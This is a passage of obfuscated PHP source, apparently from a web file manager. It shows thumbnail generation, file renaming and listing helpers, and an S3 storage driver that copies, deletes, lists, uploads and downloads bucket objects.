($ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[190]] == $¸óÕî¿Ó[191] && isset($ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[192]]) && $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[192]] == kodIO::sourceID($æàôÍâ‘)) { $†…­İşû = $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[193]]; if ($ÀÁÙÄ¦Ï <= 500) { $ŞâÚÙµó = preg_replace($¸óÕî¿Ó[194], $¸óÕî¿Ó[195], $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[32]]); $†…­İşû = IO::fileNameExist($æàôÍâ‘, $ŞâÚÙµó); } return IO::fileOut(KodIO::make($†…­İşû), !1, $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[32]]); } $„üœ«Ü = IO::fileNameExist($æàôÍâ‘, $Èş–ÕÙã); if ($„üœ«Ü) { return IO::fileOut(KodIO::make($„üœ«Ü), !1, $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[32]]); } if ($ÀÁÙÄ¦Ï > 1000) { $this->makeImageCover($æàôÍâ‘, $¨ÍŒµà, $Èş–ÕÙã, $ÀÁÙÄ¦Ï); $this->makeImageCover($æàôÍâ‘, $¨ÍŒµà, "\x63\x6f\x76\145\162\x5f{$ªı’÷àÂ}\x5f\62\65\x30\56\x70\x6e\147", 250); $„üœ«Ü = IO::fileNameExist($æàôÍâ‘, $Èş–ÕÙã); if ($„üœ«Ü) { return IO::fileOut(KodIO::make($„üœ«Ü), !1, $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[32]]); } die; } if (!kodIO::allowCover($ƒó†Ÿ‘Ÿ)) { return $this->fileOut($¨ÍŒµà, !1, $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[32]]); } $Ö¦ì—Ñ = Cache::get($Èş–ÕÙã); if ($Ö¦ì—Ñ == $¸óÕî¿Ó[196] || $Ö¦ì—Ñ == $¸óÕî¿Ó[197]) { echo $Ö¦ì—Ñ; die; } Cache::set($Èş–ÕÙã, $¸óÕî¿Ó[197], 60); $´›£É« = array($æàôÍâ‘, $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[87]], $Èş–ÕÙã, $ÀÁÙÄ¦Ï); $¯œÆ©²¢ = $¸óÕî¿Ó[198] . $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[79]] . $¸óÕî¿Ó[199] . $Èş–ÕÙã . $¸óÕî¿Ó[200] . $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[32]] . $¸óÕî¿Ó[201] . $ƒó†Ÿ‘Ÿ[$¸óÕî¿Ó[87]]; TaskQueue::add($¸óÕî¿Ó[202], $´›£É«, $¯œÆ©²¢, $Èş–ÕÙã); } public function makeImageCover($§Ø‹¯®÷, $ïÂæ±¤Ğ, $çãÛÖâ, $š³¦³°³) { $ª¿É²ÊÛ =& $_SERVER[²Ö÷öõ]; if (IO::fileNameExist($§Ø‹¯®÷, $çãÛÖâ)) { return $ª¿É²ÊÛ[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Ë¯Í×¾© = DATA_THUMB . $çãÛÖâ; del_file($Ë¯Í×¾©); $ß„îÈŠˆ = IO::copy($ïÂæ±¤Ğ, TEMP_FILES, !1, $çãÛÖâ); if (!@file_exists($ß„îÈŠˆ)) { return $ª¿É²ÊÛ[204]; } ImageThumb::createThumb($ß„îÈŠˆ, $Ë¯Í×¾©, $š³¦³°³, $š³¦³°³ * 10); if (@file_exists($Ë¯Í×¾©)) { Cache::remove($çãÛÖâ); return IO::move($Ë¯Í×¾©, $§Ø‹¯®÷); } Cache::set($çãÛÖâ, $ª¿É²ÊÛ[196], 600); del_file($Ë¯Í×¾©); return $ª¿É²ÊÛ[205] . $ß„îÈŠˆ . $ª¿É²ÊÛ[74]; } public function fileOutImageServer($÷õˆÛÇá, $àÚñš = 250) { $this->fileOutImage($÷õˆÛÇá, $àÚñš); } public function fileNameAuto($óúù¥èû, $¼ˆşŠÊ›, $êÛß±¾ = REPEAT_RENAME, $üÒè‘¥Ò = false) { $–Áû©ºû =& $_SERVER[²Ö÷öõ]; $ÓÓâœÌ´ = $óúù¥èû === $–Áû©ºû[12] ? $¼ˆşŠÊ› : rtrim($óúù¥èû, $–Áû©ºû[8]) . $–Áû©ºû[8] . $¼ˆşŠÊ›; if ($êÛß±¾ == REPEAT_REPLACE || !$this->exist($ÓÓâœÌ´) || $üÒè‘¥Ò && $êÛß±¾ != REPEAT_RENAME_FOLDER) { return $¼ˆşŠÊ›; } if ($êÛß±¾ == REPEAT_SKIP) { return !1; } $ëƒüúœÇ = $–Áû©ºû[10] . get_path_ext($¼ˆşŠÊ›); $ëƒüúœÇ = $ëƒüúœÇ == $–Áû©ºû[10] || $üÒè‘¥Ò ? $–Áû©ºû[12] : $ëƒüúœÇ; $ø»öØÎ» = 1; $–›âíÒ = substr($¼ˆşŠÊ›, 0, strlen($¼ˆşŠÊ›) - strlen($ëƒüúœÇ)); $áÏãë = $–›âíÒ . "\x28{$ø»öØÎ»}\x29{$ëƒüúœÇ}"; while ($this->exist(rtrim($óúù¥èû, $–Áû©ºû[8]) . $–Áû©ºû[8] . $áÏãë)) { $áÏãë = $–›âíÒ . "\x28{$ø»öØÎ»}\x29{$ëƒüúœÇ}"; $ø»öØÎ»++; } return $áÏãë; } private function fileNameAutoList($È€·ƒĞ¸, $Ê³Ğ±Ï, $åÂ˜ÒÄ— = false) { $œîû…¶ =& $_SERVER[²Ö÷öõ]; $¦İ¦±Ò£ = $this->listPath($È€·ƒĞ¸, !0); $¦İ¦±Ò£ = array_merge($¦İ¦±Ò£[$œîû…¶[85]], $¦İ¦±Ò£[$œîû…¶[86]]); $Í—œ ¯¬ = array_to_keyvalue($¦İ¦±Ò£, $œîû…¶[12], $œîû…¶[32]); $ÁçÌ¥¥ƒ = $œîû…¶[10] . get_path_ext($Ê³Ğ±Ï); $ÁçÌ¥¥ƒ = $ÁçÌ¥¥ƒ == $œîû…¶[10] || $åÂ˜ÒÄ— ? $œîû…¶[12] : $ÁçÌ¥¥ƒ; $¶ó¤ = substr($Ê³Ğ±Ï, 0, strlen($Ê³Ğ±Ï) - strlen($ÁçÌ¥¥ƒ)); $ÁÃğºáñ = $¶ó¤ . "\x28\x30\x29{$ÁçÌ¥¥ƒ}"; for ($¸İ¤ê§Ò = 1; $¸İ¤ê§Ò <= count($Í—œ ¯¬) + 1; $¸İ¤ê§Ò++) { $ÁÃğºáñ = $¶ó¤ . "\50{$¸İ¤ê§Ò}\x29{$ÁçÌ¥¥ƒ}"; if (!in_array_not_case($ÁÃğºáñ, $Í—œ ¯¬)) { return $ÁÃğºáñ; } } return $ÁÃğºáñ; } public function listAllFiles($äûŞ‡°¬, $ªÄŸ±å­) { $¦ïç…à‡ =& $_SERVER[²Ö÷öõ]; if (empty($ªÄŸ±å­)) { return array(); } $«š Œ­  = array_keys($ªÄŸ±å­); $÷¯Ÿş = array(); $äûŞ‡°¬ = trim($äûŞ‡°¬, $¦ïç…à‡[8]); foreach ($ªÄŸ±å­ as $Ü¡“Ã†ç => $ÖîÏĞı) { $§Í²†© = ltrim(substr(trim($Ü¡“Ã†ç, $¦ïç…à‡[8]), strlen($äûŞ‡°¬)), $¦ïç…à‡[8]); if (substr($Ü¡“Ã†ç, -1) == $¦ïç…à‡[8]) { $§Í²†© = rtrim($§Í²†©, $¦ïç…à‡[8]) . $¦ïç…à‡[8]; } $÷¯Ÿş = array_merge($÷¯Ÿş, $this->slicePath($§Í²†©)); } $ãîóõô = array(); foreach (array_unique($÷¯Ÿş) as $ßôâ®’¢) { $÷ÌÊÏÊ÷ = array($¦ïç…à‡[87] => $this->getPathOuter($¦ïç…à‡[8] . $äûŞ‡°¬ . $¦ïç…à‡[8] . $ßôâ®’¢), $¦ïç…à‡[78] => 1, $¦ïç…à‡[79] => 0); if (substr($ßôâ®’¢, -1) != $¦ïç…à‡[8]) { $÷ÌÊÏÊ÷[$¦ïç…à‡[78]] = 0; $Í›ò÷„ = $this->getPath($äûŞ‡°¬ . $¦ïç…à‡[8] . $ßôâ®’¢); if (isset($ªÄŸ±å­[$Í›ò÷„])) { $®£˜ç = $ªÄŸ±å­[$Í›ò÷„]; if (isset($®£˜ç[$¦ïç…à‡[79]])) { $÷ÌÊÏÊ÷[$¦ïç…à‡[79]] = intval($®£˜ç[$¦ïç…à‡[79]]); } if (isset($®£˜ç[$¦ïç…à‡[206]])) { $÷ÌÊÏÊ÷[$¦ïç…à‡[88]] = intval($®£˜ç[$¦ïç…à‡[206]]); } } } $ãîóõô[] = $÷ÌÊÏÊ÷; } return $ãîóõô; } public function slicePath($šüÏ¡‚š) { $–Ôîôîş =& $_SERVER[²Ö÷öõ]; $ò²ŞìÜ = explode($–Ôîôîş[8], trim($šüÏ¡‚š, $–Ôîôîş[8])); $”‚ïİŸÖ = 0; do { ++$”‚ïİŸÖ; $èº„“»[] = implode($–Ôîôîş[8], array_slice($ò²ŞìÜ, 0, $”‚ïİŸÖ)) . $–Ôîôîş[8]; } while ($”‚ïİŸÖ < count($ò²ŞìÜ)); $èº„“»[count($ò²ŞìÜ) - 1] = $šüÏ¡‚š; return $èº„“»; } public function getHost() { $ÔÏ·ÇšÂ =& $_SERVER[²Ö÷öõ]; $’Ü¹èĞ = parse_url(trim($this->domain, $ÔÏ·ÇšÂ[8])); $šÖœ¨¯ = isset($’Ü¹èĞ[$ÔÏ·ÇšÂ[207]]) ? $’Ü¹èĞ[$ÔÏ·ÇšÂ[207]] : http_type(); $ÑÈ¦ˆŸ = isset($’Ü¹èĞ[$ÔÏ·ÇšÂ[208]]) ? $’Ü¹èĞ[$ÔÏ·ÇšÂ[208]] : $’Ü¹èĞ[$ÔÏ·ÇšÂ[87]]; if (isset($’Ü¹èĞ[$ÔÏ·ÇšÂ[209]])) { $ÑÈ¦ˆŸ .= $ÔÏ·ÇšÂ[4] . $’Ü¹èĞ[$ÔÏ·ÇšÂ[209]]; } return $šÖœ¨¯ . $ÔÏ·ÇšÂ[210] . $ÑÈ¦ˆŸ; } public function pathEncode($ÌÊŒıîÖ) { $œµÄ¿İ¢ =& $_SERVER[²Ö÷öõ]; return str_replace($œµÄ¿İ¢[211], $œµÄ¿İ¢[8], rawurlencode($ÌÊŒıîÖ)); } public function writeLog($¼Ì–Å€ = '', $³×ÌÁÊº = false) { $î‰ïêîì =& $_SERVER[²Ö÷öõ]; $¸á©ÄñÈ = in_array(ACTION, array($î‰ïêîì[212], $î‰ïêîì[213])); if (!$¸á©ÄñÈ && !GLOBAL_DEBUG) { return; } $ÃØ­•Ò = $¼Ì–Å€; static $³ â¨æ½ = null; if (!$³ â¨æ½) { $³ â¨æ½ = strtoupper($this->getType()); } $¼Ì–Å€ = $³ â¨æ½ . $î‰ïêîì[214] . $¼Ì–Å€; if ($³×ÌÁÊº) { $œ“Üê¸¡ = error_get_last(); if ($œ“Üê¸¡) { $¼Ì–Å€ = array($¼Ì–Å€, $œ“Üê¸¡); } } write_log($¼Ì–Å€, $î‰ïêîì[215]); if ($¸á©ÄñÈ) { throw new Exception($ÃØ­•Ò); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($æ×ÅúŞ”) { set_timeout(); require_once SDK_DIR . $_SERVER[²Ö÷öõ][216]; parent::__construct(); $this->_init($æ×ÅúŞ”); } public function _init($‡Ø‹±‰Ç) { $èµ–Ù½ =& $_SERVER[²Ö÷öõ]; $this->config = $‡Ø‹±‰Ç; foreach ($‡Ø‹±‰Ç as $æÎ’´İ˜ => $Ë¥ŸÙÇ) { if (isset($this->{$æÎ’´İ˜})) { $this->{$æÎ’´İ˜} = $Ë¥ŸÙÇ; } } $this->endpoint = $‡Ø‹±‰Ç[$èµ–Ù½[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($èµ–Ù½[212], $èµ–Ù½[213]))) { $this->client->setExceptions(); } } public function setSignVersion($Ş§ª“¾› = "\x76\x34") { $this->signVer = $Ş§ª“¾›; $this->client->setSignatureVersion($Ş§ª“¾›); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ÜÕæ‘›) { return null; } } public function isBucketCors() { $îğ‡ôÕ =& $_SERVER[²Ö÷öõ]; $İ·Óìö = $this->getBucketCors(); if (!$İ·Óìö || !is_array($İ·Óìö)) { return !1; } if (!is_array($İ·Óìö[$îğ‡ôÕ[218]])) { $İ·Óìö[$îğ‡ôÕ[218]] = explode($îğ‡ôÕ[50], $İ·Óìö[$îğ‡ôÕ[218]]); } if ($İ·Óìö[$îğ‡ôÕ[219]] != $îğ‡ôÕ[220] || !in_array($îğ‡ôÕ[220], $İ·Óìö[$îğ‡ôÕ[218]])) { return !1; } $ñîÛò·‘ = array_map($îğ‡ôÕ[221], $İ·Óìö[$îğ‡ôÕ[222]]); if (!is_array($ñîÛò·‘)) { $ñîÛò·‘ = array(); } $õÀ¿ÍÍª = array($îğ‡ôÕ[223], $îğ‡ôÕ[224], $îğ‡ôÕ[225], $îğ‡ôÕ[226], $îğ‡ôÕ[227]); $ Á‰« = array_diff($õÀ¿ÍÍª, $ñîÛò·‘); return empty($ Á‰«); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ƒÕæÑ×Ë, $÷õŞØ´¡ = '', $»§¤ëÃß = REPEAT_RENAME) { $Æƒåü½¢ = $this->setContent($ƒÕæÑ×Ë, $÷õŞØ´¡); if ($Æƒåü½¢ !== !1) { return $this->getPathOuter($ƒÕæÑ×Ë); } return !1; } public function mkdir($²ıı‚’ß, $¤‘ı±ì¯ = REPEAT_SKIP) { $´†˜ÕŒ’ =& $_SERVER[²Ö÷öõ]; if (empty($²ıı‚’ß) && $²ıı‚’ß !== $´†˜ÕŒ’[228]) { return !1; } if ($¤‘ı±ì¯ && $this->_isFolder($²ıı‚’ß)) { return $this->getPathOuter($²ıı‚’ß); } $ñ‰ä¢¢œ = $this->setContent($²ıı‚’ß, $´†˜ÕŒ’[12], !0); if ($ñ‰ä¢¢œ !== !1) { return $this->getPathOuter($²ıı‚’ß); } return !1; } public function copyFile($Îè‹êéã, $Ó° Á†, $°›¾àå« = array()) { $üç…½ =& $_SERVER[²Ö÷öõ]; $¯¶ºÌÖğ = $this->objectMeta($Îè‹êéã); if (!$¯¶ºÌÖğ) { return !1; } if ($¯¶ºÌÖğ[$üç…½[79]] <= 1024 * 1024 * 200) { $ª€êìË¬ = $this->client->copyObject($this->bucket, $Îè‹êéã, $this->bucket, $Ó° Á†, $üç…½[229], $°›¾àå«); } else { $ª€êìË¬ = $this->client->multiCopyObject($this->bucket, $Îè‹êéã, $this->bucket, $Ó° Á†, $°›¾àå«); } $ª€êìË¬ = $ª€êìË¬ ? $this->getPathOuter($Ó° Á†) : !1; return $ª€êìË¬; } public function moveFile($©æ„¤â, $„Æäîµ) { if ($this->copyFile($©æ„¤â, $„Æäîµ)) { $this->delFile($©æ„¤â); return $this->getPathOuter($„Æäîµ); } return !1; } public function delFile($ˆ·üÜÀ‚) { return $this->client->deleteObject($this->bucket, $ˆ·üÜÀ‚); } public function delFolder($ï˜¾á»é) { $š½­‚Ê =& $_SERVER[²Ö÷öõ]; if (!$this->exist($ï˜¾á»é)) { return !0; } $this->listItemCache = !1; $ı’åù¸‰ = $this->fileList($ï˜¾á»é); $this->listItemCache = !0; $êæÊ‚¯ = trim($ï˜¾á»é, $š½­‚Ê[8]) . $š½­‚Ê[8]; if (!empty($ï˜¾á»é) && $ï˜¾á»é !== $š½­‚Ê[228] && !in_array($êæÊ‚¯, $ı’åù¸‰[$š½­‚Ê[85]])) { $ı’åù¸‰[$š½­‚Ê[85]][] = $êæÊ‚¯; } $ªø©Ô¯Î = $this->delByBatch($ı’åù¸‰[$š½­‚Ê[86]]); if (!$ªø©Ô¯Î) { return !1; } $ªø©Ô¯Î = $this->delByBatch($ı’åù¸‰[$š½­‚Ê[85]]); if (!$ªø©Ô¯Î) { return !1; } return $this->delFile($êæÊ‚¯); } private function delByBatch($õµÑƒ•÷) { foreach (array_chunk($õµÑƒ•÷, 1000) as $İµ³Øœ‚) { $òŒ™æŸ = $this->client->deleteObjects($this->bucket, $İµ³Øœ‚); if (!$òŒ™æŸ) { return !1; } } return !0; } public function rename($ñóÖ¸È, $çÄÛ¸Ğö) { return $this->renameObject($ñóÖ¸È, $çÄÛ¸Ğö); } public function listPath($ÜüëßøÖ, $ĞÂáÔıõ = false) { $©ıö«÷ï =& $_SERVER[²Ö÷öõ]; $††ôÇ› = $this->fileList($ÜüëßøÖ, $©ıö«÷ï[8], !0); foreach ($††ôÇ›[$©ıö«÷ï[85]] as $î„¬Ûø‰ => $ûŞ«À©) { $††ôÇ›[$©ıö«÷ï[85]][$î„¬Ûø‰] = $this->folderInfo($ûŞ«À©, $ĞÂáÔıõ, $ûŞ«À©); } foreach ($††ôÇ›[$©ıö«÷ï[86]] as $î„¬Ûø‰ => $ûŞ«À©) { $††ôÇ›[$©ıö«÷ï[86]][$î„¬Ûø‰] = $this->fileInfo($ûŞ«À©[$©ıö«÷ï[32]], $ĞÂáÔıõ, $ûŞ«À©); } return $††ôÇ›; } protected function infoChildren($Ë¨Î œó, &$×ñÄ€½Ù) { $‹ÖÕô¦› =& $_SERVER[²Ö÷öõ]; $şº—Œ’ = $this->fileList($Ë¨Î œó, $‹ÖÕô¦›[12], !0); $×ñÄ€½Ù[$‹ÖÕô¦›[81]] += count($şº—Œ’[$‹ÖÕô¦›[85]]); $×ñÄ€½Ù[$‹ÖÕô¦›[80]] += count($şº—Œ’[$‹ÖÕô¦›[86]]); foreach ($şº—Œ’[$‹ÖÕô¦›[86]] as $•ìŞ†³Å) { if (!$•ìŞ†³Å || !$•ìŞ†³Å[$‹ÖÕô¦›[79]]) { continue; } $×ñÄ€½Ù[$‹ÖÕô¦›[79]] += $•ìŞ†³Å[$‹ÖÕô¦›[79]]; } } private function fileInfo($ÂïÂ˜øü, $ÂêÇ×µØ = false, $Û­øäÙç = array()) { $ ¯ˆ®ëµ =& $_SERVER[²Ö÷öõ]; $‰©“£ïÙ = array($ ¯ˆ®ëµ[32] => $this->pathThis($ÂïÂ˜øü), $ ¯ˆ®ëµ[87] => $this->getPathOuter($ÂïÂ˜øü), $ ¯ˆ®ëµ[33] => $ ¯ˆ®ëµ[230], $ ¯ˆ®ëµ[169] => $this->ext($ÂïÂ˜øü), $ ¯ˆ®ëµ[79] => isset($Û­øäÙç[$ ¯ˆ®ëµ[79]]) ? $Û­øäÙç[$ ¯ˆ®ëµ[79]] : 0); if ($ÂêÇ×µØ) { return $‰©“£ïÙ; } $‰©“£ïÙ[$ ¯ˆ®ëµ[231]] = $‰©“£ïÙ[$ ¯ˆ®ëµ[88]] = 0; $‰©“£ïÙ[$ ¯ˆ®ëµ[232]] = $‰©“£ïÙ[$ ¯ˆ®ëµ[233]] = !0; if (empty($Û­øäÙç)) { $Û­øäÙç = $this->objectMeta($ÂïÂ˜øü); if (!$Û­øäÙç) { return $‰©“£ïÙ; } } if (isset($Û­øäÙç[$ ¯ˆ®ëµ[234]]) && $Û­øäÙç[$ ¯ˆ®ëµ[234]]) { $‰©“£ïÙ[$ ¯ˆ®ëµ[235]] = $Û­øäÙç[$ ¯ˆ®ëµ[234]]; } if (isset($Û­øäÙç[$ ¯ˆ®ëµ[206]])) { $‰©“£ïÙ[$ ¯ˆ®ëµ[88]] = $Û­øäÙç[$ ¯ˆ®ëµ[206]]; } if (isset($Û­øäÙç[$ ¯ˆ®ëµ[79]])) { $‰©“£ïÙ[$ ¯ˆ®ëµ[79]] = $Û­øäÙç[$ ¯ˆ®ëµ[79]]; } return $‰©“£ïÙ; } private function folderInfo($ß¶Ã¾ì, $¶æĞ‚É³ = false, $¥¡’ÕñŠ = array()) { $„Ëàİ°Ô =& $_SERVER[²Ö÷öõ]; $ì»ºøŸé = array($„Ëàİ°Ô[32] => $this->pathThis($ß¶Ã¾ì), $„Ëàİ°Ô[87] => $this->getPathOuter($„Ëàİ°Ô[8] . $ß¶Ã¾ì), $„Ëàİ°Ô[33] => $„Ëàİ°Ô[78]); if ($¶æĞ‚É³) { return $ì»ºøŸé; } $ì»ºøŸé[$„Ëàİ°Ô[231]] = $ì»ºøŸé[$„Ëàİ°Ô[88]] = 0; $ì»ºøŸé[$„Ëàİ°Ô[232]] = $ì»ºøŸé[$„Ëàİ°Ô[233]] = !0; if ($ß¶Ã¾ì == $„Ëàİ°Ô[12]) { return $ì»ºøŸé; } if (empty($¥¡’ÕñŠ)) { $¥¡’ÕñŠ = $this->objectMeta(trim($ß¶Ã¾ì, $„Ëàİ°Ô[8]) . $„Ëàİ°Ô[8]); } if (isset($¥¡’ÕñŠ[$„Ëàİ°Ô[206]])) { $ì»ºøŸé[$„Ëàİ°Ô[231]] = $¥¡’ÕñŠ[$„Ëàİ°Ô[206]]; } return $ì»ºøŸé; } private function fileList($Õ”¨äŞ´, $ù«‚ãõê = '', $Ò©òæ”å = 0) { $ÔÙûõÑÌ =& $_SERVER[²Ö÷öõ]; $Ò–· ¸ = rtrim($Õ”¨äŞ´, $ÔÙûõÑÌ[8]) . $ÔÙûõÑÌ[8]; $ º÷äº = $this->listObjs($Ò–· ¸, null, null, $ù«‚ãõê); if (!$ º÷äº) { return array($ÔÙûõÑÌ[85] => array(), $ÔÙûõÑÌ[86] => array()); } $Ó†°§ñ¹ = $ˆ†€‰£Ï = array(); foreach ($ º÷äº[$ÔÙûõÑÌ[236]] as $ÚÍ–âüô) { $±÷“áéí = $ÚÍ–âüô[$ÔÙûõÑÌ[32]]; if ($±÷“áéí == $Ò–· ¸) { continue; } $İáé¼¼¡ = isset($ÚÍ–âüô[$ÔÙûõÑÌ[79]]) ? $ÚÍ–âüô[$ÔÙûõÑÌ[79]] : 0; $øÅáíàÉ = $İáé¼¼¡ == 0 && substr($±÷“áéí, strlen($±÷“áéí) - 1, 1) == $ÔÙûõÑÌ[8] ? !0 : !1; $this->cacheMethodInfoSet($±÷“áéí, $øÅáíàÉ, $ÚÍ–âüô); if ($øÅáíàÉ) { $Ó†°§ñ¹[] = $±÷“áéí; continue; } $ˆ†€‰£Ï[] = $Ò©òæ”å ? $ÚÍ–âüô : $±÷“áéí; } foreach ($ º÷äº[$ÔÙûõÑÌ[237]] as $ÚÍ–âüô) { $Ó†°§ñ¹[] = $ÚÍ–âüô[$ÔÙûõÑÌ[32]]; $this->cacheMethodInfoSet($ÚÍ–âüô[$ÔÙûõÑÌ[32]], !0); } $this->cacheMethodInfoSet($Õ”¨äŞ´, !0); return array($ÔÙûõÑÌ[85] => $Ó†°§ñ¹, $ÔÙûõÑÌ[86] => $ˆ†€‰£Ï); } private function listObjs($³íÓò—×, $ì´œüØ¦ = null, $Ê¨Â§§¢ = null, $¯‹ŸØÏ¡ = null) { $äŸ¤²äÛ =& $_SERVER[²Ö÷öõ]; $³íÓò—× = trim($³íÓò—×, $äŸ¤²äÛ[8]); $Æ–Ôİ¹Š = empty($³íÓò—×) && $³íÓò—× !== $äŸ¤²äÛ[228] ? $äŸ¤²äÛ[12] : $³íÓò—× . $äŸ¤²äÛ[8]; return $this->client->getBucket($this->bucket, $Æ–Ôİ¹Š, $ì´œüØ¦, $Ê¨Â§§¢, $¯‹ŸØÏ¡, !0); } public function has($î•÷å—, $‰ğÜôô = false, $‹Õ‹ï›â = true) { $Ší°®­ =& $_SERVER[²Ö÷öõ]; $î•÷å— = trim($î•÷å—, $Ší°®­[8]); $æòœâ = empty($î•÷å—) && $î•÷å— !== $Ší°®­[228] ? $Ší°®­[12] : $î•÷å— . $Ší°®­[8]; $¦ÅÓ¸åÉ = null; $£ÄÈ‚ÅÒ = 500; $î¥ÛÛ = $Ší°®­[8]; $ñ™¾€º© = $»ÊÚğŒ = array(); while (!0) { $…Ğ«›™à = $this->listObjs($î•÷å—, $¦ÅÓ¸åÉ, $£ÄÈ‚ÅÒ, $î¥ÛÛ); if (!$…Ğ«›™à) { break; } $¦ÅÓ¸åÉ = $…Ğ«›™à[$Ší°®­[238]]; $³­ƒù· = $…Ğ«›™à[$Ší°®­[236]]; $Úäº¦€ˆ = $…Ğ«›™à[$Ší°®­[237]]; if (empty($³­ƒù·) && empty($Úäº¦€ˆ)) { break; } if (count($³­ƒù·) == 1 && $³­ƒù·[0][$Ší°®­[32]] == $æòœâ) { break; } if ($‰ğÜôô) { if (count($³­ƒù·)) { $³­ƒù· = array_column($³­ƒù·, $Ší°®­[32]); $ñ™¾€º© = array_merge($ñ™¾€º©, $³­ƒù·); } if (count($Úäº¦€ˆ)) { $Úäº¦€ˆ = array_column($Úäº¦€ˆ, $Ší°®­[32]); $»ÊÚğŒ = array_merge($»ÊÚğŒ, $Úäº¦€ˆ); } if ($¦ÅÓ¸åÉ === null) { break; } continue; } if ($‹Õ‹ï›â) { if (!empty($³­ƒù·)) { if (count($³­ƒù·) > 1 || isset($³­ƒù·[0][$Ší°®­[32]]) && $³­ƒù·[0][$Ší°®­[32]] != $æòœâ) { return !0; } } } else { if (!empty($Úäº¦€ˆ)) { return !0; } } if ($¦ÅÓ¸åÉ === null) { break; } } if ($‰ğÜôô) { $ñ™¾€º© = array_diff($ñ™¾€º©, array($æòœâ)); $ñ™¾€º© = count(array_unique($ñ™¾€º©)); $»ÊÚğŒ = count(array_unique($»ÊÚğŒ)); return array($Ší°®­[239] => $ñ™¾€º©, $Ší°®­[240] => $»ÊÚğŒ); } return !1; } public function listAll($ìºÖ” ) { $ò¤ô°ğİ =& $_SERVER[²Ö÷öõ]; $•ƒ„àÉĞ = $this->fileList($ìºÖ” , $ò¤ô°ğİ[12], !0); $ğ´•Ä¿Á = array_to_keyvalue($•ƒ„àÉĞ[$ò¤ô°ğİ[86]], $ò¤ô°ğİ[32]); foreach ($•ƒ„àÉĞ[$ò¤ô°ğİ[85]] as $æÃ§¬ÛÛ) { if (is_string($æÃ§¬ÛÛ)) { $ğ´•Ä¿Á[$æÃ§¬ÛÛ] = array($ò¤ô°ğİ[79] => 0); } } return $this->listAllFiles($ìºÖ” , $ğ´•Ä¿Á); } public function canRead($–¹Â®ÁÀ) { $½ò–¿èß =& $_SERVER[²Ö÷öõ]; $¡Ğ–òÒÙ = $this->client->getAccessControlPolicy($this->bucket, $–¹Â®ÁÀ); if (!$¡Ğ–òÒÙ) { return !1; } return in_array($¡Ğ–òÒÙ, array($½ò–¿èß[241], $½ò–¿èß[242], $½ò–¿èß[243])) ? !0 : !1; } public function canWrite($ÁÅâ†÷¿) { $ã¢£ÖËÜ =& $_SERVER[²Ö÷öõ]; $Ğ¤Ğûğ– = $this->client->getAccessControlPolicy($this->bucket, $ÁÅâ†÷¿); if (!$Ğ¤Ğûğ–) { return !1; } return in_array($Ğ¤Ğûğ–, array($ã¢£ÖËÜ[241], $ã¢£ÖËÜ[242])) ? !0 : !1; } public function getContent($ü×¿ÜšÇ) { return $this->client->getObject($this->bucket, $ü×¿ÜšÇ); } public function setContent($¬™òøÑ, $Šèû£º¯ = '', $°Èˆµº˜ = false) { $›§Åé·¨ =& $_SERVER[²Ö÷öõ]; $¬™òøÑ = $°Èˆµº˜ ? trim($¬™òøÑ, $›§Åé·¨[8]) . $›§Åé·¨[8] : $¬™òøÑ; $º¶ø‡¶» = get_file_mime(get_path_ext($¬™òøÑ)); $¾Ì«Ÿï = $this->client->putObject($Šèû£º¯, $this->bucket, $¬™òøÑ, $›§Åé·¨[229], array(), $º¶ø‡¶»); if (!$¾Ì«Ÿï) { return !1; } if ($°Èˆµº˜) { return !0; } return $¾Ì«Ÿï ? !0 : !1; } public function fileSubstr($²­Î­, $ÎòßŠĞœ, $ª¿ªöÌ¹) { $øöğ‡­ä = $ÎòßŠĞœ + $ª¿ªöÌ¹ - 1; return $this->client->getObject($this->bucket, $²­Î­, array($_SERVER[²Ö÷öõ][244] => "\142\171\x74\x65\163\x3d{$ÎòßŠĞœ}\55{$øöğ‡­ä}")); } public function upload($şêÄ­“´, $‡ò¸˜Ù, $–½…èÔé = false, $é˜Œ®Ù = REPEAT_REPLACE) { $åúûà• =& $_SERVER[²Ö÷öõ]; $¶Å—Ú´® = array($åúûà•[245] => @md5_file($‡ò¸˜Ù)); $ê±‚Ç…Ş = array($åúûà•[246] => get_file_mime(get_path_ext($şêÄ­“´))); if (IO::size($‡ò¸˜Ù) <= 1024 * 1024 * 200) { $Õ›şªˆó = $this->client->putObjectFile($‡ò¸˜Ù, $this->bucket, $şêÄ­“´, $åúûà•[229], $¶Å—Ú´®, $ê±‚Ç…Ş); return !empty($Õ›şªˆó) ? $this->getPathOuter($şêÄ­“´) : !1; } $É®Æº»¦ = $this->client->multiUploadObject($‡ò¸˜Ù, $this->bucket, trim($şêÄ­“´, $åúûà•[8]), $¶Å—Ú´®, $ê±‚Ç…Ş); return $É®Æº»¦ ? $this->getPathOuter($şêÄ­“´) : !1; } public function download($×ï‘¸öÕ, $“±§Ÿ“¬) { if (!@is_dir($this->pathFather($“±§Ÿ“¬)) && !IO::mkdir($this->pathFather($“±§Ÿ“¬))) { return !1; } $ââ—šÕŞ = $this->client->getObject($this->bucket, $×ï‘¸öÕ, array(), $“±§Ÿ“¬); return $ââ—šÕŞ !== !1 ? $“±§Ÿ“¬ : 